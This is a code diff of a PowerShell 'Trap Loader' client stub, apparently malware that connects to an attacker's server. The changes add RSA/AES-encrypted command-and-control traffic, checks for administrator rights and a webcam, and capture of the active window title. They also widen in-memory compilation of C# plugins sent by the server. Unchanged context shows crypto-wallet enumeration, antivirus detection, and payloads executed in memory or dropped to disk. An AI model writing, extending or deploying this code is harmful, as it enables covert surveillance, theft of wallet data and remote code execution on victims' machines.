@@ -1,318 +1,159 @@
-# Trap Loader Stub - TCP Binary Client with AES-256-GCM
+# Trap Loader Stub - AES-256-CBC + HMAC-SHA256 + RSA Key Exchange
 # Placeholders are replaced at build time by the Builder
 
 $serverUrl = "{{SERVER_URL}}"
 $httpPassword = "{{PASSWORD}}"
 $encryptionKey = "{{ENCRYPTION_KEY}}"
 
-# ==================== AES-256-GCM VIA WINDOWS BCRYPT ====================
+# ==================== AES-256-CBC + HMAC-SHA256 ====================
 
-Add-Type -TypeDefinition @"
-using System;
-using System.IO;
-using System.Runtime.InteropServices;
-using System.Security.Cryptography;
-using System.Text;
+$script:globalAesKey = $null
 
-public static class AesGcmHelper
-{
-    private const int SaltSize = 16;
-    private const int NonceSize = 12;
-    private const int TagSize = 16;
-    private const int KeySize = 32;
-    private const int Pbkdf2Iterations = 100000;
-    private const int MinEncryptedSize = SaltSize + NonceSize + TagSize + 1;
-
-    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
-    private static extern int BCryptOpenAlgorithmProvider(
-        out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);
-
-    [DllImport("bcrypt.dll")]
-    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);
-
-    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
-    private static extern int BCryptSetProperty(
-        IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);
-
-    [DllImport("bcrypt.dll")]
-    private static extern int BCryptGenerateSymmetricKey(
-        IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject,
-        byte[] pbSecret, int cbSecret, uint dwFlags);
-
-    [DllImport("bcrypt.dll")]
-    private static extern int BCryptDestroyKey(IntPtr hKey);
-
-    [DllImport("bcrypt.dll")]
-    private static extern int BCryptEncrypt(
-        IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo,
-        byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput,
-        out int pcbResult, uint dwFlags);
-
-    [DllImport("bcrypt.dll")]
-    private static extern int BCryptDecrypt(
-        IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo,
-        byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput,
-        out int pcbResult, uint dwFlags);
-
-    [StructLayout(LayoutKind.Sequential)]
-    private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
-    {
-        public int cbSize;
-        public int dwInfoVersion;
-        public IntPtr pbNonce;
-        public int cbNonce;
-        public IntPtr pbAuthData;
-        public int cbAuthData;
-        public IntPtr pbTag;
-        public int cbTag;
-        public IntPtr pbMacContext;
-        public int cbMacContext;
-        public int cbAAD;
-        public long cbData;
-        public int dwFlags;
-    }
-
-    private const string BCRYPT_AES_ALGORITHM = "AES";
-    private const string BCRYPT_CHAINING_MODE = "ChainingMode";
-    private const string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
-    private const int STATUS_SUCCESS = 0;
-
-    private static byte[] DeriveKey(string password, byte[] salt)
-    {
-        using (var pbkdf2 = new Rfc2898DeriveBytes(password, salt, Pbkdf2Iterations,
-            HashAlgorithmName.SHA256))
-        {
-            return pbkdf2.GetBytes(KeySize);
-        }
-    }
-
-    private static byte[] GcmEncrypt(byte[] key, byte[] nonce, byte[] plaintext, out byte[] tag)
-    {
-        IntPtr hAlg = IntPtr.Zero;
-        IntPtr hKey = IntPtr.Zero;
-        tag = new byte[TagSize];
-
-        try
-        {
-            int status = BCryptOpenAlgorithmProvider(out hAlg, BCRYPT_AES_ALGORITHM, null, 0);
-            if (status != STATUS_SUCCESS)
-                throw new CryptographicException("BCryptOpenAlgorithmProvider failed: " + status);
-
-            byte[] chainMode = Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_GCM);
-            status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0);
-            if (status != STATUS_SUCCESS)
-                throw new CryptographicException("BCryptSetProperty failed: " + status);
-
-            status = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
-            if (status != STATUS_SUCCESS)
-                throw new CryptographicException("BCryptGenerateSymmetricKey failed: " + status);
-
-            byte[] ciphertext = new byte[plaintext.Length];
-            byte[] ivCopy = (byte[])nonce.Clone();
-
-            var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
-            authInfo.cbSize = Marshal.SizeOf(authInfo);
-            authInfo.dwInfoVersion = 1;
-
-            GCHandle nonceHandle = GCHandle.Alloc(ivCopy, GCHandleType.Pinned);
-            GCHandle tagHandle = GCHandle.Alloc(tag, GCHandleType.Pinned);
-
-            try
-            {
-                authInfo.pbNonce = nonceHandle.AddrOfPinnedObject();
-                authInfo.cbNonce = ivCopy.Length;
-                authInfo.pbTag = tagHandle.AddrOfPinnedObject();
-                authInfo.cbTag = TagSize;
-
-                IntPtr pAuthInfo = Marshal.AllocHGlobal(Marshal.SizeOf(authInfo));
-                try
-                {
-                    Marshal.StructureToPtr(authInfo, pAuthInfo, false);
-
-                    int bytesWritten;
-                    status = BCryptEncrypt(hKey, plaintext, plaintext.Length, pAuthInfo,
-                        null, 0, ciphertext, ciphertext.Length, out bytesWritten, 0);
-                    if (status != STATUS_SUCCESS)
-                        throw new CryptographicException("BCryptEncrypt failed: " + status);
-                }
-                finally
-                {
-                    Marshal.FreeHGlobal(pAuthInfo);
-                }
-            }
-            finally
-            {
-                nonceHandle.Free();
-                tagHandle.Free();
-            }
-
-            return ciphertext;
-        }
-        finally
-        {
-            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
-            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
-        }
-    }
-
-    private static byte[] GcmDecrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
-    {
-        IntPtr hAlg = IntPtr.Zero;
-        IntPtr hKey = IntPtr.Zero;
-
-        try
-        {
-            int status = BCryptOpenAlgorithmProvider(out hAlg, BCRYPT_AES_ALGORITHM, null, 0);
-            if (status != STATUS_SUCCESS)
-                throw new CryptographicException("BCryptOpenAlgorithmProvider failed: " + status);
-
-            byte[] chainMode = Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_GCM);
-            status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0);
-            if (status != STATUS_SUCCESS)
-                throw new CryptographicException("BCryptSetProperty failed: " + status);
-
-            status = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
-            if (status != STATUS_SUCCESS)
-                throw new CryptographicException("BCryptGenerateSymmetricKey failed: " + status);
-
-            byte[] plaintext = new byte[ciphertext.Length];
-            byte[] ivCopy = (byte[])nonce.Clone();
-            byte[] tagCopy = (byte[])tag.Clone();
-
-            var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
-            authInfo.cbSize = Marshal.SizeOf(authInfo);
-            authInfo.dwInfoVersion = 1;
-
-            GCHandle nonceHandle = GCHandle.Alloc(ivCopy, GCHandleType.Pinned);
-            GCHandle tagHandle = GCHandle.Alloc(tagCopy, GCHandleType.Pinned);
-
-            try
-            {
-                authInfo.pbNonce = nonceHandle.AddrOfPinnedObject();
-                authInfo.cbNonce = ivCopy.Length;
-                authInfo.pbTag = tagHandle.AddrOfPinnedObject();
-                authInfo.cbTag = tagCopy.Length;
-
-                IntPtr pAuthInfo = Marshal.AllocHGlobal(Marshal.SizeOf(authInfo));
-                try
-                {
-                    Marshal.StructureToPtr(authInfo, pAuthInfo, false);
-
-                    int bytesWritten;
-                    status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, pAuthInfo,
-                        null, 0, plaintext, plaintext.Length, out bytesWritten, 0);
-                    if (status != STATUS_SUCCESS)
-                        throw new CryptographicException("GCM tag verification failed");
-                }
-                finally
-                {
-                    Marshal.FreeHGlobal(pAuthInfo);
-                }
-            }
-            finally
-            {
-                nonceHandle.Free();
-                tagHandle.Free();
-            }
-
-            return plaintext;
-        }
-        finally
-        {
-            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
-            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
-        }
-    }
-
-    public static byte[] Encrypt(string plainText, string password)
-    {
-        byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
-        return EncryptBytes(plainBytes, password);
-    }
-
-    public static byte[] EncryptBytes(byte[] plainBytes, string password)
-    {
-        byte[] salt = new byte[SaltSize];
-        byte[] nonce = new byte[NonceSize];
-
-        using (var rng = RandomNumberGenerator.Create())
-        {
-            rng.GetBytes(salt);
-            rng.GetBytes(nonce);
-        }
-
-        byte[] key = DeriveKey(password, salt);
-        byte[] tag;
-        byte[] cipherText = GcmEncrypt(key, nonce, plainBytes, out tag);
-
-        byte[] result = new byte[SaltSize + NonceSize + TagSize + cipherText.Length];
-        int offset = 0;
-
-        Buffer.BlockCopy(salt, 0, result, offset, SaltSize);
-        offset += SaltSize;
-        Buffer.BlockCopy(nonce, 0, result, offset, NonceSize);
-        offset += NonceSize;
-        Buffer.BlockCopy(tag, 0, result, offset, TagSize);
-        offset += TagSize;
-        Buffer.BlockCopy(cipherText, 0, result, offset, cipherText.Length);
-
-        return result;
-    }
-
-    public static string DecryptToString(byte[] encryptedBytes, string password)
-    {
-        byte[] plainBytes = DecryptToBytes(encryptedBytes, password);
-        if (plainBytes == null) return null;
-        return Encoding.UTF8.GetString(plainBytes);
-    }
-
-    public static byte[] DecryptToBytes(byte[] encryptedBytes, string password)
-    {
-        if (encryptedBytes == null || encryptedBytes.Length < MinEncryptedSize)
-            return null;
-
-        int offset = 0;
-
-        byte[] salt = new byte[SaltSize];
-        Buffer.BlockCopy(encryptedBytes, offset, salt, 0, SaltSize);
-        offset += SaltSize;
-
-        byte[] nonce = new byte[NonceSize];
-        Buffer.BlockCopy(encryptedBytes, offset, nonce, 0, NonceSize);
-        offset += NonceSize;
-
-        byte[] tag = new byte[TagSize];
-        Buffer.BlockCopy(encryptedBytes, offset, tag, 0, TagSize);
-        offset += TagSize;
-
-        int cipherLen = encryptedBytes.Length - offset;
-        byte[] cipherText = new byte[cipherLen];
-        Buffer.BlockCopy(encryptedBytes, offset, cipherText, 0, cipherLen);
-
-        byte[] key = DeriveKey(password, salt);
-
-        try
-        {
-            return GcmDecrypt(key, nonce, cipherText, tag);
-        }
-        catch (CryptographicException)
-        {
-            return null;
-        }
-    }
-}
-"@ -ReferencedAssemblies @('System.dll') -ErrorAction Stop
-
-# ==================== ENCRYPTION WRAPPERS ====================
-
-function Encrypt-Payload {
-    param([string]$PlainText, [string]$Key)
-    return [AesGcmHelper]::Encrypt($PlainText, $Key)
+function Derive-HmacKey {
+    param([byte[]]$AesKey)
+    $hex = ($AesKey | ForEach-Object { $_.ToString("x2") }) -join ""
+    $sha = [System.Security.Cryptography.SHA256]::Create()
+    $hmacStr = [Text.Encoding]::UTF8.GetBytes("HMAC-" + $hex)
+    $hash = $sha.ComputeHash($hmacStr)
+    $sha.Dispose()
+    return $hash
 }
 
-function Decrypt-Bytes {
-    param([byte[]]$CipherBytes, [string]$Key)
-    return [AesGcmHelper]::DecryptToBytes($CipherBytes, $Key)
+function Write-EncryptedMessage {
+    param(
+        [System.IO.Stream]$Stream,
+        [byte]$MsgType,
+        [byte[]]$Payload,
+        [byte[]]$AesKey
+    )
+
+    $payloadLen = if ($Payload) { $Payload.Length } else { 0 }
+    $plaintextLen = 1 + $payloadLen
+    $plaintext = New-Object byte[] $plaintextLen
+    $plaintext[0] = $MsgType
+    if ($payloadLen -gt 0) {
+        [Array]::Copy($Payload, 0, $plaintext, 1, $payloadLen)
+    }
+
+    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+    $iv = New-Object byte[] 16
+    $rng.GetBytes($iv)
+    $rng.Dispose()
+
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = $AesKey
+    $aes.IV = $iv
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $enc = $aes.CreateEncryptor()
+    $ciphertext = $enc.TransformFinalBlock($plaintext, 0, $plaintextLen)
+    $enc.Dispose()
+    $aes.Dispose()
+
+    $ivCipher = New-Object byte[] (16 + $ciphertext.Length)
+    [Array]::Copy($iv, 0, $ivCipher, 0, 16)
+    [Array]::Copy($ciphertext, 0, $ivCipher, 16, $ciphertext.Length)
+
+    $hmacKey = Derive-HmacKey -AesKey $AesKey
+    $h = [System.Security.Cryptography.HMACSHA256]::new($hmacKey)
+    $hmac = $h.ComputeHash($ivCipher)
+    $h.Dispose()
+
+    $totalLen = $ivCipher.Length + 32
+    $packet = New-Object byte[] (4 + $totalLen)
+    $packet[0] = [byte]($totalLen -band 0xFF)
+    $packet[1] = [byte](($totalLen -shr 8) -band 0xFF)
+    $packet[2] = [byte](($totalLen -shr 16) -band 0xFF)
+    $packet[3] = [byte](($totalLen -shr 24) -band 0xFF)
+    [Array]::Copy($ivCipher, 0, $packet, 4, $ivCipher.Length)
+    [Array]::Copy($hmac, 0, $packet, 4 + $ivCipher.Length, 32)
+
+    $Stream.Write($packet, 0, $packet.Length)
+    $Stream.Flush()
+}
+
+function Read-TcpExact {
+    param(
+        [System.IO.Stream]$Stream,
+        [int]$Count
+    )
+
+    $buffer = New-Object byte[] $Count
+    $totalRead = 0
+
+    while ($totalRead -lt $Count) {
+        $read = $Stream.Read($buffer, $totalRead, $Count - $totalRead)
+        if ($read -le 0) { return $null }
+        $totalRead += $read
+    }
+
+    return $buffer
+}
+
+function Read-EncryptedMessage {
+    param(
+        [System.IO.Stream]$Stream,
+        [byte[]]$AesKey
+    )
+
+    $lenBuf = Read-TcpExact -Stream $Stream -Count 4
+    if ($null -eq $lenBuf) { return $null }
+
+    $totalLen = [int]$lenBuf[0] -bor
+                ([int]$lenBuf[1] -shl 8) -bor
+                ([int]$lenBuf[2] -shl 16) -bor
+                ([int]$lenBuf[3] -shl 24)
+
+    if ($totalLen -le 32 -or $totalLen -gt 5242880) {
+        return $null
+    }
+
+    $data = Read-TcpExact -Stream $Stream -Count $totalLen
+    if ($null -eq $data) { return $null }
+
+    $ivCipherLen = $totalLen - 32
+    $ivCipher = New-Object byte[] $ivCipherLen
+    $receivedHmac = New-Object byte[] 32
+    [Array]::Copy($data, 0, $ivCipher, 0, $ivCipherLen)
+    [Array]::Copy($data, $ivCipherLen, $receivedHmac, 0, 32)
+
+    $hmacKey = Derive-HmacKey -AesKey $AesKey
+    $h = [System.Security.Cryptography.HMACSHA256]::new($hmacKey)
+    $computedHmac = $h.ComputeHash($ivCipher)
+    $h.Dispose()
+
+    if ($computedHmac.Length -ne $receivedHmac.Length) { return $null }
+    for ($i = 0; $i -lt $computedHmac.Length; $i++) {
+        if ($computedHmac[$i] -ne $receivedHmac[$i]) { return $null }
+    }
+
+    if ($ivCipherLen -lt 16) { return $null }
+
+    $iv = New-Object byte[] 16
+    $ciphertext = New-Object byte[] ($ivCipherLen - 16)
+    [Array]::Copy($ivCipher, 0, $iv, 0, 16)
+    [Array]::Copy($ivCipher, 16, $ciphertext, 0, $ciphertext.Length)
+
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = $AesKey
+    $aes.IV = $iv
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $dec = $aes.CreateDecryptor()
+    $plaintext = $dec.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
+    $dec.Dispose()
+    $aes.Dispose()
+
+    if ($plaintext.Length -lt 1) { return $null }
+
+    $msgType = $plaintext[0]
+    $payload = $null
+    if ($plaintext.Length -gt 1) {
+        $payload = New-Object byte[] ($plaintext.Length - 1)
+        [Array]::Copy($plaintext, 1, $payload, 0, $payload.Length)
+    }
+
+    return @{ Type = $msgType; Payload = $payload }
 }
 
 # ==================== SYSTEM INFO ====================
@@ -472,6 +313,24 @@ function Get-WalletNames {
     return ($walletNames | Select-Object -Unique) -join ", "
 }
 
+function Get-IsAdmin {
+    try {
+        $p = [System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()
+        if ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) { return "Yes" }
+        return "No"
+    } catch { return "Unknown" }
+}
+
+function Get-HasWebcam {
+    try {
+        $cameras = Get-CimInstance -ClassName Win32_PnPEntity -ErrorAction Stop |
+            Where-Object { $_.PNPClass -eq "Image" -or $_.PNPClass -eq "Camera" -or $_.Name -like "*camera*" -or $_.Name -like "*webcam*" } |
+            Select-Object -First 1
+        if ($cameras) { return "Yes" }
+        return "No"
+    } catch { return "Unknown" }
+}
+
 function Get-SystemInfo {
     $osVer = Get-WindowsVersion
     $machine = $env:COMPUTERNAME
@@ -483,14 +342,17 @@ function Get-SystemInfo {
     }
     $av = Get-SpecificAntivirus
     $wallets = Get-WalletNames
-    return "$osVer|$machine|$av|$wallets"
+    $isAdmin = Get-IsAdmin
+    $hasWebcam = Get-HasWebcam
+    return "$osVer|$machine|$av|$wallets|$isAdmin|$hasWebcam"
 }
 
-# ==================== TCP BINARY PROTOCOL ====================
+# ==================== MESSAGE TYPES ====================
 
 $MSG_AUTH          = [byte]0x01
 $MSG_HEARTBEAT     = [byte]0x02
 $MSG_CLIENT_INFO   = [byte]0x03
+$MSG_ACTIVE_WINDOW = [byte]0x04
 $MSG_PLUGIN_DATA   = [byte]0x10
 $MSG_PLUGIN_BATCH  = [byte]0x11
 
@@ -501,76 +363,37 @@ $MSG_PLUGIN_CMD    = [byte]0x90
 $MSG_FILE_TRANSFER = [byte]0x91
 $MSG_DISCONNECT    = [byte]0xFF
 
-function Write-TcpMessage {
-    param(
-        [System.IO.Stream]$Stream,
-        [byte]$MsgType,
-        [byte[]]$Payload
-    )
+# ==================== ACTIVE WINDOW (user32 P/Invoke) ====================
 
-    $payloadLen = if ($Payload) { $Payload.Length } else { 0 }
-    $totalLen = 1 + $payloadLen
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+public static class ActiveWindowHelper
+{
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetForegroundWindow();
 
-    $packet = New-Object byte[] (4 + $totalLen)
-    $packet[0] = [byte]($totalLen -band 0xFF)
-    $packet[1] = [byte](($totalLen -shr 8) -band 0xFF)
-    $packet[2] = [byte](($totalLen -shr 16) -band 0xFF)
-    $packet[3] = [byte](($totalLen -shr 24) -band 0xFF)
-    $packet[4] = $MsgType
+    [DllImport("user32.dll")]
+    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
-    if ($Payload -and $Payload.Length -gt 0) {
-        [Array]::Copy($Payload, 0, $packet, 5, $Payload.Length)
+    public static string GetActiveWindowTitle()
+    {
+        try
+        {
+            IntPtr hwnd = GetForegroundWindow();
+            if (hwnd == IntPtr.Zero) return "";
+            StringBuilder sb = new StringBuilder(256);
+            GetWindowText(hwnd, sb, 256);
+            return sb.ToString();
+        }
+        catch { return ""; }
     }
-
-    $Stream.Write($packet, 0, $packet.Length)
-    $Stream.Flush()
 }
+"@ -ReferencedAssemblies @('System.dll') -ErrorAction Stop
 
-function Read-TcpExact {
-    param(
-        [System.IO.Stream]$Stream,
-        [int]$Count
-    )
-
-    $buffer = New-Object byte[] $Count
-    $totalRead = 0
-
-    while ($totalRead -lt $Count) {
-        $read = $Stream.Read($buffer, $totalRead, $Count - $totalRead)
-        if ($read -le 0) { return $null }
-        $totalRead += $read
-    }
-
-    return $buffer
-}
-
-function Read-TcpMessage {
-    param([System.IO.Stream]$Stream)
-
-    $lenBuf = Read-TcpExact -Stream $Stream -Count 4
-    if ($null -eq $lenBuf) { return $null }
-
-    $totalLen = [int]$lenBuf[0] -bor
-                ([int]$lenBuf[1] -shl 8) -bor
-                ([int]$lenBuf[2] -shl 16) -bor
-                ([int]$lenBuf[3] -shl 24)
-
-    if ($totalLen -le 0 -or $totalLen -gt 5242880) {
-        return $null
-    }
-
-    $msgBuf = Read-TcpExact -Stream $Stream -Count $totalLen
-    if ($null -eq $msgBuf) { return $null }
-
-    $msgType = $msgBuf[0]
-    $payload = $null
-
-    if ($totalLen -gt 1) {
-        $payload = New-Object byte[] ($totalLen - 1)
-        [Array]::Copy($msgBuf, 1, $payload, 0, $totalLen - 1)
-    }
-
-    return @{ Type = $msgType; Payload = $payload }
+function Get-ActiveWindowTitle {
+    return [ActiveWindowHelper]::GetActiveWindowTitle()
 }
 
 # ==================== PLUGIN ENGINE ====================
@@ -653,6 +476,19 @@ public class PluginRunner
 
 $global:ActivePlugins = @{}
 
+function Resolve-AssemblyPath {
+    param([string]$name)
+    $fwDir = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
+    $path = Join-Path $fwDir $name
+    if (Test-Path $path) { return $path }
+    try {
+        $base = $name -replace '\.dll$'
+        $asm = [System.Reflection.Assembly]::LoadWithPartialName($base)
+        if ($asm) { return $asm.Location }
+    } catch {}
+    return $null
+}
+
 # ==================== PLUGIN FUNCTIONS ====================
 
 function Invoke-PluginCommand {
@@ -665,16 +501,39 @@ function Invoke-PluginCommand {
             try {
                 $code = [Text.Encoding]::UTF8.GetString($Data)
 
-                # Build referenced assemblies list - include System.Management for process manager
-                $refs = @(
+                $cp = New-Object Microsoft.CSharp.CSharpCodeProvider
+                $params = New-Object System.CodeDom.Compiler.CompilerParameters
+                $params.GenerateInMemory = $true
+                $params.TreatWarningsAsErrors = $false
+                $params.WarningLevel = 4
+                $refNames = @(
                     'System.dll',
+                    'System.Core.dll',
                     'System.Drawing.dll',
                     'System.Windows.Forms.dll',
-                    'System.Management.dll'
+                    'System.Management.dll',
+                    'System.Xml.dll',
+                    'System.Xml.Linq.dll',
+                    'System.IO.Compression.dll',
+                    'System.IO.Compression.FileSystem.dll',
+                    'System.Runtime.Serialization.dll',
+                    'System.Speech.dll',
+                    'System.ServiceModel.dll',
+                    'System.ServiceProcess.dll',
+                    'System.Transactions.dll',
+                    'System.Web.dll',
+                    'System.Web.Extensions.dll',
+                    'System.DirectoryServices.dll',
+                    'System.Messaging.dll'
                 )
-
-                Add-Type -TypeDefinition $code -ReferencedAssemblies $refs -ErrorAction Stop
-                $pluginInstance = New-Object "ClientPlugin_$($PluginId).Main"
+                foreach ($r in $refNames) {
+                    $path = Resolve-AssemblyPath $r
+                    if ($path) { $null = $params.ReferencedAssemblies.Add($path) }
+                }
+                $result = $cp.CompileAssemblyFromSource($params, $code)
+                if ($result.Errors.HasErrors) { throw ($result.Errors | Select-Object -First 1).ErrorText }
+                $pluginInstance = $result.CompiledAssembly.CreateInstance("ClientPlugin_$($PluginId).Main")
+                if ($null -eq $pluginInstance) { throw "Plugin type not found" }
                 $runner = New-Object PluginRunner
                 $runner.Start($pluginInstance)
                 $global:ActivePlugins[$PluginId] = @{ Runner = $runner }
@@ -736,7 +595,7 @@ function Get-HasPluginOutput {
 }
 
 function Send-AllPluginOutput {
-    param([System.IO.Stream]$Stream)
+    param([System.IO.Stream]$Stream, [byte[]]$AesKey)
 
     $anySent = $false
 
@@ -766,7 +625,7 @@ function Send-AllPluginOutput {
             [Array]::Copy($idBytes, 0, $payload, 1, $idBytes.Length)
             [Array]::Copy($item, 0, $payload, 1 + $idBytes.Length, $item.Length)
 
-            Write-TcpMessage -Stream $Stream -MsgType $MSG_PLUGIN_DATA -Payload $payload
+            Write-EncryptedMessage -Stream $Stream -MsgType $MSG_PLUGIN_DATA -Payload $payload -AesKey $AesKey
             $sent++
             $anySent = $true
         }
@@ -802,41 +661,35 @@ function Handle-PluginCmd {
 }
 
 function Handle-FileTransfer {
-    param([byte[]]$Payload)
-    if ($null -eq $Payload -or $Payload.Length -lt 30) {
+    param([byte[]]$Payload, [byte[]]$AesKey)
+    if ($null -eq $Payload -or $Payload.Length -lt 3) {
         Write-Host "$(Get-Date -Format 'HH:mm:ss') - File transfer payload too small" -ForegroundColor Red
         return
     }
 
-    $decryptedBytes = Decrypt-Bytes -CipherBytes $Payload -Key $encryptionKey
-    if ($null -eq $decryptedBytes -or $decryptedBytes.Length -lt 3) {
-        Write-Host "$(Get-Date -Format 'HH:mm:ss') - File decryption failed" -ForegroundColor Red
-        return
-    }
-
-    $execMode = $decryptedBytes[0]
-    $hashLen = [int]$decryptedBytes[1]
+    $execMode = $Payload[0]
+    $hashLen = [int]$Payload[1]
     $offset = 2
 
-    if (($offset + $hashLen) -gt $decryptedBytes.Length) {
+    if (($offset + $hashLen) -gt $Payload.Length) {
         Write-Host "$(Get-Date -Format 'HH:mm:ss') - Invalid file transfer metadata" -ForegroundColor Red
         return
     }
 
     $expectedHash = ""
     if ($hashLen -gt 0) {
-        $expectedHash = [Text.Encoding]::UTF8.GetString($decryptedBytes, $offset, $hashLen)
+        $expectedHash = [Text.Encoding]::UTF8.GetString($Payload, $offset, $hashLen)
         $offset += $hashLen
     }
 
-    $fileLen = $decryptedBytes.Length - $offset
+    $fileLen = $Payload.Length - $offset
     if ($fileLen -le 0) {
         Write-Host "$(Get-Date -Format 'HH:mm:ss') - Empty file payload" -ForegroundColor Red
         return
     }
 
     $fileBytes = New-Object byte[] $fileLen
-    [Array]::Copy($decryptedBytes, $offset, $fileBytes, 0, $fileLen)
+    [Array]::Copy($Payload, $offset, $fileBytes, 0, $fileLen)
 
     $modeName = if ($execMode -eq 0x01) { "IN-MEMORY" } else { "DROP-TO-DISK" }
     Write-Host "$(Get-Date -Format 'HH:mm:ss') - File received: $($fileBytes.Length) bytes ($modeName)" -ForegroundColor Green
@@ -903,11 +756,11 @@ if ([string]::IsNullOrWhiteSpace($sHost)) {
 }
 
 Write-Host "========================================" -ForegroundColor Cyan
-Write-Host " Trap Loader Client (TCP)" -ForegroundColor Cyan
+Write-Host " Trap Loader Client (AES-CBC)" -ForegroundColor Cyan
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host " Server  : $sHost`:$sPort" -ForegroundColor Gray
 Write-Host " Machine : $machineId" -ForegroundColor Gray
-Write-Host " Crypto  : AES-256-GCM (BCrypt)" -ForegroundColor Gray
+Write-Host " Crypto  : AES-256-CBC + HMAC-SHA256" -ForegroundColor Gray
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 
@@ -949,10 +802,54 @@ while ($true) {
         }
 
         $stream = $tcpClient.GetStream()
-        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Connected!" -ForegroundColor Green
+        Write-Host "$(Get-Date -Format 'HH:mm:ss') - TCP connected! Performing key exchange..." -ForegroundColor Green
+
+        # ========== RSA KEY EXCHANGE ==========
+        # Read server RSA public key (4-byte LE length + CSP blob)
+        $keyLenBuf = Read-TcpExact -Stream $stream -Count 4
+        if ($null -eq $keyLenBuf) {
+            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Failed to read key length" -ForegroundColor Red
+            throw "Key exchange failed"
+        }
+        $serverKeyLen = [int]$keyLenBuf[0] -bor ([int]$keyLenBuf[1] -shl 8) -bor ([int]$keyLenBuf[2] -shl 16) -bor ([int]$keyLenBuf[3] -shl 24)
+        if ($serverKeyLen -le 0 -or $serverKeyLen -gt 1024) {
+            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Invalid key length: $serverKeyLen" -ForegroundColor Red
+            throw "Key exchange failed"
+        }
+
+        $serverRsaPubKey = Read-TcpExact -Stream $stream -Count $serverKeyLen
+        if ($null -eq $serverRsaPubKey) {
+            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Failed to read RSA public key" -ForegroundColor Red
+            throw "Key exchange failed"
+        }
+        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Received server public key ($serverKeyLen bytes)" -ForegroundColor Gray
+
+        # Generate random AES-256 key
+        $aesKey = New-Object byte[] 32
+        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+        $rng.GetBytes($aesKey)
+        $rng.Dispose()
+
+        # Encrypt AES key with server's RSA public key (PKCS#1 v1.5)
+        $rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new()
+        $rsa.ImportCspBlob($serverRsaPubKey)
+        $encAesKey = $rsa.Encrypt($aesKey, $false)
+        $rsa.Dispose()
+
+        # Send encrypted AES key (4-byte LE length + encrypted key)
+        $encKeyLenBuf = New-Object byte[] 4
+        $encKeyLenBuf[0] = [byte]($encAesKey.Length -band 0xFF)
+        $encKeyLenBuf[1] = [byte](($encAesKey.Length -shr 8) -band 0xFF)
+        $encKeyLenBuf[2] = [byte](($encAesKey.Length -shr 16) -band 0xFF)
+        $encKeyLenBuf[3] = [byte](($encAesKey.Length -shr 24) -band 0xFF)
+        $stream.Write($encKeyLenBuf, 0, 4)
+        $stream.Write($encAesKey, 0, $encAesKey.Length)
+        $stream.Flush()
+
+        $script:globalAesKey = $aesKey
+        Write-Host "$(Get-Date -Format 'HH:mm:ss') - AES key exchange complete! Channel encrypted." -ForegroundColor Green
 
         # ========== AUTHENTICATION ==========
-
         $authJson = @{
             password   = $httpPassword
             machine_id = $machineId
@@ -960,9 +857,9 @@ while ($true) {
         } | ConvertTo-Json -Compress -Depth 5
 
         $authBytes = [Text.Encoding]::UTF8.GetBytes($authJson)
-        Write-TcpMessage -Stream $stream -MsgType $MSG_AUTH -Payload $authBytes
+        Write-EncryptedMessage -Stream $stream -MsgType $MSG_AUTH -Payload $authBytes -AesKey $aesKey
 
-        $authResp = Read-TcpMessage -Stream $stream
+        $authResp = Read-EncryptedMessage -Stream $stream -AesKey $aesKey
         if ($null -eq $authResp) {
